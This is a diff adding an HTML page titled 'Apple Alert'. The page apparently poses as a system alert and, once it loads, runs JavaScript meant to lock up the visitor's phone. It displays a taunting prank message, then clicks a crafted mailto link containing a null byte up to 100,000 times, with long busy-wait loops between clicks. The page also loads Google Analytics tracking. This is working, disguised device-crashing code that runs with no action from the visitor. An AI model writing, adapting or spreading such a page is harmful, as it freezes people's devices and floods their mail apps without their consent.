@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"
+>
+
+<title>Apple Alert</title>
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-73784359-11', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<style>body {
+  /* for safari's tint */
+  background-color: blue;
+  /* for the document's body background color */
+  background-image: linear-gradient(to bottom, red 0%, red 100%);
+}
+</style>
+</head>
+
+
+<body>
+<p>&nbsp;</p>
+<p id="status">&nbsp;</p>
+<p id="result" style="color: black;">&nbsp;</p>
+<center>
+<h1 style="color: black; align: justify; margin-top: 2%;"><br /><br />You Just PLAYED YOUR SELF<br /><br /><br /><br /><br /><br /><br /><br />Dont click on random links. It screws up your phone.</h1>
+</center>
+<body>
+    
+</body>
+<script src="http://code.jquery.com/jquery-1.12.0.min.js"></script>
+
+
+<script type="text/javascript">
+
+var extraData = "";
+for (itxextraData = 0; itxextraData < 1; itxextraData++) {
+	 var extraData = "You Just Got Pranked! " + "Lesson learned, don't ever click on random links. Especially a website called playedyoursed";
+}
+
+
+ 
+jQuery('#result').append('<a href="mailto:foo@example.com?&body=Prank%20Your%20Friends!%20!cc=prank@prank.com&subject=Sorry!%20You%20Got!%20Pranked%20%20%20%20%20%20' + extraData + '%00"></a>');
+
+
+
+  document.querySelector('a').click(0);
+
+ for(var i=0;i<100000;i++){
+ 	 if(i>0) {
+ 	 
+	 document.querySelector('a').click();
+	 for(var x=0;x<10000;x++){
+	 console.log();
+	 }
+    
+} else {
+    document.querySelector('a').click();
+    for(var x=0;x<100000;x++){
+	 console.log();
+}
+ 
+ }
+ }
+ 
+</script>
+
+</html>
